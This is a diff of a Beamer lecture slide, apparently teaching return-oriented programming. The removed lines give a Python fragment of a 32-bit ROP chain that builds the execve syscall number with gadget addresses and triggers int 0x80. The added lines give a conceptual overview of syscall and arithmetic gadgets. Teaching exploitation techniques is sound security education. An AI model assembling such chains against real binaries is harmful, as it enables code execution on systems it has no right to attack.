@@ -1,17 +1,8 @@
-\frametitle{Generating the payload, init params, syscall}
-    \begin{lstlisting}[style=code, language=python]
-p += pack('<I', 0x080506c0) # xor eax, eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08082a9e) # inc eax ; ret
-p += pack('<I', 0x08049b2a) # int 0x80
-print p
-    \end{lstlisting}
+\frametitle{Useful gadgets: Systemcalls, arithmetics}
+    \begin{itemize}
+        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents
+        \item Since programs run in userspace we have limited privileges, if we can find systemcalls we can, in combination with the arithmetic operations and pop instructions call arbitrary system calls
+    \end{itemize}
+\begin{lstlisting}[style=result]
+int 0x80; ret;
+\end{lstlisting}
